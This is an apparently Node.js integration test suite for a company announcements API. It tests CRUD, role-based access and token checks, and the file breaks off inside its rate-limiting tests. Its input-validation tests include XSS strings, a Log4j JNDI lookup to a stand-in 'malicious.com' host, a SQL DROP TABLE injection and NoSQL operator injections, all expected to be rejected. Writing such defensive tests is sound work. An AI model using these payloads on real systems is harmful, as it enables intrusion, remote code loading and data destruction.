const request = require('supertest');
const app = require('../../server');
const db = require('../../src/config/database');
const User = require('../../src/models/User');
const Announcement = require('../../src/models/Announcement');

describe('Company Announcements System Integration Tests', () => {
  let adminToken, employeeToken, managerToken;
  let adminUser, employeeUser, managerUser;
  let testAnnouncement;

  beforeAll(async () => {
    // Setup test users
    adminUser = await User.create({
      username: 'admin_test',
      email: 'admin@test.com',
      password: 'password123',
      role: 'admin'
    });

    employeeUser = await User.create({
      username: 'employee_test',
      email: 'employee@test.com',
      password: 'password123',
      role: 'employee'
    });

    managerUser = await User.create({
      username: 'manager_test',
      email: 'manager@test.com',
      password: 'password123',
      role: 'manager'
    });

    // Generate tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'admin@test.com', password: 'password123' });
    adminToken = adminLogin.body.token;

    const employeeLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'employee@test.com', password: 'password123' });
    employeeToken = employeeLogin.body.token;

    const managerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'manager@test.com', password: 'password123' });
    managerToken = managerLogin.body.token;
  });

  afterAll(async () => {
    await Announcement.deleteMany({});
    await User.deleteMany({ username: { $in: ['admin_test', 'employee_test', 'manager_test'] } });
  });

  beforeEach(async () => {
    await Announcement.deleteMany({});
  });

  // TC-001: Announcement API endpoints integration tests - Complete CRUD operations with happy path and error path coverage
  describe('[TC-001] Announcement API Endpoints Integration Tests - CRUD Operations', () => {
    describe('[TC-001] CREATE Operation - Happy Path', () => {
      test('[TC-001-CREATE-HP] should successfully create announcement with valid data and proper system field population', async () => {
        const announcementData = {
          title: 'Test Announcement',
          content: 'This is a test announcement content'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data).toHaveProperty('_id');
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(response.body.data).toHaveProperty('created_at');
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });

      test('[TC-001-CREATE-HP] should auto-populate system fields correctly during creation', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'System Fields Test',
            content: 'Testing auto-population of system fields'
          });

        expect(response.status).toBe(201);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });

      test('[TC-001-CREATE-HP] should make created announcement immediately visible to all user roles', async () => {
        const createResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Immediate Visibility Test',
            content: 'This should be visible immediately after creation'
          });

        expect(createResponse.status).toBe(201);

        // Check visibility for different user roles
        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        const managerResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${managerToken}`);

        expect(employeeResponse.status).toBe(200);
        expect(employeeResponse.body).toHaveLength(1);
        expect(employeeResponse.body[0].title).toBe('Immediate Visibility Test');

        expect(managerResponse.status).toBe(200);
        expect(managerResponse.body).toHaveLength(1);
        expect(managerResponse.body[0].title).toBe('Immediate Visibility Test');
      });
    });

    describe('[TC-001] CREATE Operation - Error Path', () => {
      test('[TC-001-CREATE-EP] should fail with 400 when title is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ content: 'Content without title' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('title');
      });

      test('[TC-001-CREATE-EP] should fail with 400 when content is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Title without content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('content');
      });

      test('[TC-001-CREATE-EP] should fail with 400 when title is empty string', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-CREATE-EP] should fail with 403 when non-admin user attempts creation', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Creation',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-CREATE-EP] should fail with 401 when no authentication token provided', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .send({
            title: 'No Auth Test',
            content: 'Should fail without authentication'
          });

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-001-CREATE-EP] should handle database connection failures gracefully', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database connection failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to create announcement');

        // Restore original method
        Announcement.create = originalCreate;
      });
    });

    describe('[TC-001] READ Operation - Happy Path', () => {
      beforeEach(async () => {
        // Create test announcements
        testAnnouncement = await Announcement.create({
          title: 'Test Read Announcement',
          content: 'Test read content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Second Announcement',
          content: 'Second content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-READ-HP] should retrieve all active announcements for employees with proper structure', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(2);
        
        response.body.forEach(announcement => {
          expect(announcement).toHaveProperty('_id');
          expect(announcement).toHaveProperty('title');
          expect(announcement).toHaveProperty('content');
          expect(announcement).toHaveProperty('created_at');
          expect(announcement.isActive).toBe(true);
          expect(announcement.title).toBeTruthy();
          expect(announcement.content).toBeTruthy();
        });
      });

      test('[TC-001-READ-HP] should retrieve all announcements for admin users', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body.length).toBeGreaterThanOrEqual(2);
      });

      test('[TC-001-READ-HP] should sort announcements by creation date (newest first)', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        const announcements = response.body;
        
        for (let i = 0; i < announcements.length - 1; i++) {
          const current = new Date(announcements[i].created_at);
          const next = new Date(announcements[i + 1].created_at);
          expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
        }
      });

      test('[TC-001-READ-HP] should return empty array when no announcements exist', async () => {
        await Announcement.deleteMany({});

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });

      test('[TC-001-READ-HP] should only show active announcements to non-admin users', async () => {
        await Announcement.create({
          title: 'Inactive Announcement',
          content: 'This should not be visible to employees',
          createdBy: adminUser._id,
          isActive: false
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        // Should still only show the 2 active announcements from beforeEach
        expect(response.body).toHaveLength(2);
        response.body.forEach(announcement => {
          expect(announcement.isActive).toBe(true);
        });
      });
    });

    describe('[TC-001] READ Operation - Error Path', () => {
      test('[TC-001-READ-EP] should fail with 403 when unauthorized user accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-READ-EP] should handle database query failures', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        // Restore original method
        Announcement.find = originalFind;
      });

      test('[TC-001-READ-EP] should fail with 401 without authentication token', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-001-READ-EP] should fail with 403 when using invalid JWT token', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', 'Bearer invalid_jwt_token');

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });
    });

    describe('[TC-001] UPDATE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-HP] should successfully update announcement title and content', async () => {
        const updatedData = {
          title: 'Updated Title',
          content: 'Updated content with new information'
        };

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updatedData);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(updatedData.title);
        expect(response.body.data.content).toBe(updatedData.content);
        expect(response.body.data._id).toBe(testAnnouncement._id.toString());
      });

      test('[TC-001-UPDATE-HP] should preserve system fields during update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id, // Attempt to change system field
            created_at: new Date('2020-01-01') // Attempt to change system field
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(new Date(response.body.data.created_at)).not.toEqual(new Date('2020-01-01'));
      });

      test('[TC-001-UPDATE-HP] should reflect changes immediately to all users', async () => {
        await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Immediately Updated',
            content: 'Should be visible immediately'
          });

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body[0].title).toBe('Immediately Updated');
        expect(employeeResponse.body[0].content).toBe('Should be visible immediately');
      });

      test('[TC-001-UPDATE-HP] should allow partial updates (only title or only content)', async () => {
        // Update only title
        const titleResponse = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Only Title Updated' });

        expect(titleResponse.status).toBe(200);
        expect(titleResponse.body.data.title).toBe('Only Title Updated');
        expect(titleResponse.body.data.content).toBe('Original content');

        // Update only content
        const contentResponse = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ content: 'Only Content Updated' });

        expect(contentResponse.status).toBe(200);
        expect(contentResponse.body.data.content).toBe('Only Content Updated');
        expect(contentResponse.body.data.title).toBe('Only Title Updated');
      });
    });

    describe('[TC-001] UPDATE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Update',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-EP] should fail with 404 when announcement does not exist', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-UPDATE-EP] should fail with 400 when using invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-UPDATE-EP] should fail with 403 when non-admin user attempts update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-UPDATE-EP] should handle database update failures', async () => {
        const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
        Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to update announcement');

        // Restore original method
        Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
      });

      test('[TC-001-UPDATE-EP] should fail with 400 when title is empty string', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-UPDATE-EP] should fail with 400 when content is empty string', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Valid title', content: '' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-UPDATE-EP] should fail with 401 when no authentication token provided', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .send({ title: 'No Auth Update' });

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });
    });

    describe('[TC-001] DELETE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'This announcement will be deleted',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-HP] should successfully delete announcement and return success message', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.message).toContain('deleted successfully');
      });

      test('[TC-001-DELETE-HP] should remove announcement from all user views immediately', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body).toHaveLength(0);

        const adminResponse = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(adminResponse.body.find(a => a._id === testAnnouncement._id.toString())).toBeUndefined();
      });

      test('[TC-001-DELETE-HP] should confirm deletion by attempting to fetch deleted announcement', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const fetchResponse = await request(app)
          .get(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(fetchResponse.status).toBe(404);
      });

      test('[TC-001-DELETE-HP] should handle multiple announcement deletions correctly', async () => {
        const secondAnnouncement = await Announcement.create({
          title: 'Second to Delete',
          content: 'This is also to be deleted',
          createdBy: adminUser._id,
          isActive: true
        });

        // Delete both announcements
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        await request(app)
          .delete(`/api/announcements/${secondAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Verify both are gone
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.body).toHaveLength(0);
      });
    });

    describe('[TC-001] DELETE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Delete',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-EP] should fail with 404 when announcement does not exist', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-DELETE-EP] should fail with 400 when using invalid ObjectId format', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-DELETE-EP] should fail with 403 when non-admin user attempts deletion', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-DELETE-EP] should handle database deletion failures', async () => {
        const originalFindByIdAndDelete = Announcement.findByIdAndDelete;
        Announcement.findByIdAndDelete = jest.fn().mockRejectedValue(new Error('Database deletion failed'));

        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to delete announcement');

        // Restore original method
        Announcement.findByIdAndDelete = originalFindByIdAndDelete;
      });

      test('[TC-001-DELETE-EP] should fail with 401 without authentication', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`);

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-001-DELETE-EP] should handle concurrent deletion attempts gracefully', async () => {
        // Attempt to delete same announcement twice simultaneously
        const deletePromises = [
          request(app)
            .delete(`/api/announcements/${testAnnouncement._id}`)
            .set('Authorization', `Bearer ${adminToken}`),
          request(app)
            .delete(`/api/announcements/${testAnnouncement._id}`)
            .set('Authorization', `Bearer ${adminToken}`)
        ];

        const responses = await Promise.all(deletePromises);
        
        // One should succeed, one should fail with 404
        const successCount = responses.filter(r => r.status === 200).length;
        const notFoundCount = responses.filter(r => r.status === 404).length;
        
        expect(successCount).toBe(1);
        expect(notFoundCount).toBe(1);
      });
    });

    describe('[TC-001] Comprehensive API Endpoint Validation', () => {
      test('[TC-001-COMPREHENSIVE] should validate complete CRUD lifecycle with proper error handling', async () => {
        // Create announcement (Happy Path)
        const createResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Lifecycle Test Announcement',
            content: 'Testing complete CRUD lifecycle'
          });

        expect(createResponse.status).toBe(201);
        expect(createResponse.body.success).toBe(true);
        const announcementId = createResponse.body.data._id;

        // Read announcement (Happy Path)
        const readResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(readResponse.status).toBe(200);
        expect(readResponse.body).toHaveLength(1);
        expect(readResponse.body[0].title).toBe('Lifecycle Test Announcement');

        // Update announcement (Happy Path)
        const updateResponse = await request(app)
          .put(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Lifecycle Test',
            content: 'Updated content for lifecycle test'
          });

        expect(updateResponse.status).toBe(200);
        expect(updateResponse.body.success).toBe(true);
        expect(updateResponse.body.data.title).toBe('Updated Lifecycle Test');

        // Verify update is visible (Happy Path)
        const readUpdatedResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(readUpdatedResponse.body[0].title).toBe('Updated Lifecycle Test');

        // Delete announcement (Happy Path)
        const deleteResponse = await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteResponse.status).toBe(200);
        expect(deleteResponse.body.success).toBe(true);

        // Verify deletion (Happy Path)
        const readAfterDeleteResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(readAfterDeleteResponse.body).toHaveLength(0);

        // Test Error Paths
        // Attempt operations on deleted announcement
        const updateDeletedResponse = await request(app)
          .put(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Should fail' });

        expect(updateDeletedResponse.status).toBe(404);

        const deleteDeletedResponse = await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteDeletedResponse.status).toBe(404);
      });

      test('[TC-001-PERMISSIONS] should validate role-based access control across all endpoints', async () => {
        const testData = {
          title: 'Permission Test',
          content: 'Testing role-based access control'
        };

        // Admin should succeed in all operations
        const adminCreateResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(testData);

        expect(adminCreateResponse.status).toBe(201);
        const announcementId = adminCreateResponse.body.data._id;

        // Employee/Manager should fail in write operations
        const employeeCreateResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send(testData);

        expect(employeeCreateResponse.status).toBe(403);

        const managerUpdateResponse = await request(app)
          .put(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${managerToken}`)
          .send({ title: 'Unauthorized update' });

        expect(managerUpdateResponse.status).toBe(403);

        const employeeDeleteResponse = await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeDeleteResponse.status).toBe(403);

        // But should succeed in read operations
        const employeeReadResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeReadResponse.status).toBe(200);

        // Clean up
        await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`);
      });

      test('[TC-001-DATA-INTEGRITY] should ensure data integrity and consistency across operations', async () => {
        // Create announcement with specific data
        const originalData = {
          title: 'Data Integrity Test',
          content: 'Original content for data integrity testing'
        };

        const createResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(originalData);

        expect(createResponse.status).toBe(201);
        const announcement = createResponse.body.data;
        const originalCreatedAt = announcement.created_at;
        const originalCreatedBy = announcement.createdBy;

        // Update announcement and verify system fields are preserved
        const updateResponse = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id.toString(), // Should be ignored
            created_at: '2020-01-01T00:00:00.000Z' // Should be ignored
          });

        expect(updateResponse.status).toBe(200);
        const updatedAnnouncement = updateResponse.body.data;

        // System fields should remain unchanged
        expect(updatedAnnouncement.createdBy).toBe(originalCreatedBy);
        expect(updatedAnnouncement.created_at).toBe(originalCreatedAt);

        // Only specified fields should be updated
        expect(updatedAnnouncement.title).toBe('Updated Title');
        expect(updatedAnnouncement.content).toBe('Updated content');
        expect(updatedAnnouncement._id).toBe(announcement._id);

        // Clean up
        await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);
      });
    });
  });

  describe('[TC-SEC-001] Security and Authorization Tests', () => {
    describe('Authentication Security', () => {
      test('[TC-SEC-001-1] should reject unauthenticated requests to all endpoints', async () => {
        const endpoints = [
          { method: 'get', path: '/api/announcements' },
          { method: 'post', path: '/api/announcements' },
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'put', path: '/api/announcements/507f1f77bcf86cd799439011' },
          { method: 'delete', path: '/api/announcements/507f1f77bcf86cd799439011' }
        ];

        for (const endpoint of endpoints) {
          const response = await request(app)[endpoint.method](endpoint.path);
          expect(response.status).toBe(401);
          expect(response.body.error).toBe('Access token required');
        }
      });

      test('[TC-SEC-001-2] should reject malformed Bearer tokens', async () => {
        const malformedTokens = [
          'Bearer',
          'Bearer ',
          'bearer valid_token',
          'Basic dGVzdDp0ZXN0',
          'Invalid format'
        ];

        for (const token of malformedTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', token);

          expect([401, 403]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-3] should reject expired or invalid JWT tokens', async () => {
        const invalidTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
          'expired_token_here',
          'tampered_token_content'
        ];

        for (const token of invalidTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${token}`);

          expect(response.status).toBe(403);
          expect(response.body.error).toBe('Invalid or expired token');
        }
      });

      test('[TC-SEC-001-4] should prevent token reuse after user deletion', async () => {
        // Create temporary user
        const tempUser = await User.create({
          username: 'temp_user',
          email: 'temp@test.com',
          password: 'password123',
          role: 'employee'
        });

        // Generate token for temp user
        const loginResponse = await request(app)
          .post('/api/auth/login')
          .send({ email: 'temp@test.com', password: 'password123' });
        const tempToken = loginResponse.body.token;

        // Verify token works initially
        const validResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(validResponse.status).toBe(200);

        // Delete user
        await User.deleteOne({ _id: tempUser._id });

        // Token should now be invalid
        const invalidResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(invalidResponse.status).toBe(403);
      });
    });

    describe('Authorization Security', () => {
      test('[TC-SEC-001-5] should enforce role-based access control for admin endpoints', async () => {
        const adminEndpoints = [
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'post', path: '/api/announcements', data: { title: 'Test', content: 'Test' } }
        ];

        const nonAdminTokens = [employeeToken, managerToken];

        for (const endpoint of adminEndpoints) {
          for (const token of nonAdminTokens) {
            const request_obj = request(app)[endpoint.method](endpoint.path)
              .set('Authorization', `Bearer ${token}`);
            
            if (endpoint.data) {
              request_obj.send(endpoint.data);
            }

            const response = await request_obj;
            expect(response.status).toBe(403);
            expect(response.body.message || response.body.error).toContain('Admin privileges required');
          }
        }
      });

      test('[TC-SEC-001-6] should prevent privilege escalation attempts', async () => {
        // Attempt to modify user role through announcement creation
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Test',
            content: 'Test',
            createdBy: adminUser._id,
            role: 'admin'
          });

        expect(response.status).toBe(403);
      });

      test('[TC-SEC-001-7] should prevent cross-user data access', async () => {
        // Create announcement as admin
        const announcement = await Announcement.create({
          title: 'Admin Only',
          content: 'Secret content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Employee should not be able to modify admin's announcement
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Hacked' });

        expect(response.status).toBe(403);
      });
    });

    describe('Input Validation Security', () => {
      test('[TC-SEC-001-8] should sanitize and validate announcement content', async () => {
        const maliciousInputs = [
          {
            title: '<script>alert("XSS")</script>',
            content: 'Normal content',
            expectedStatus: 400
          },
          {
            title: 'Normal title',
            content: '<img src=x onerror=alert("XSS")>',
            expectedStatus: 400
          },
          {
            title: '${jndi:ldap://malicious.com/a}',
            content: 'Log4j injection attempt',
            expectedStatus: 400
          },
          {
            title: "'; DROP TABLE announcements; --",
            content: 'SQL injection attempt',
            expectedStatus: 400
          }
        ];

        for (const input of maliciousInputs) {
          const response = await request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send(input);

          expect(response.status).toBe(input.expectedStatus);
          if (response.status === 400) {
            expect(response.body.message).toContain('Invalid content format');
          }
        }
      });

      test('[TC-SEC-001-9] should prevent NoSQL injection in queries', async () => {
        const maliciousQueries = [
          { id: '{"$ne": null}' },
          { id: '{"$regex": ".*"}' },
          { id: '{"$where": "this.title.length > 0"}' }
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get(`/api/announcements/${query.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 404]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-10] should validate request size limits', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-SEC-001-11] should validate ObjectId format in parameters', async () => {
        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];

        for (const id of invalidIds) {
          const response = await request(app)
            .get(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(response.status).toBe(400);
          expect(response.body.message).toContain('Invalid ID format');
        }
      });
    });

    describe('Rate Limiting and DoS Protection', () => {
      test('[TC-SEC-001-12] should implement rate limiting for announcement creation', async () => {
        const requests = Array.from({ length: 20 }, (_, i) =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              title: `Spam announcement ${i}`,
              content: `Spam content ${i}`
            })
        );

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);
        
        // Should have some rate limited responses
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      });

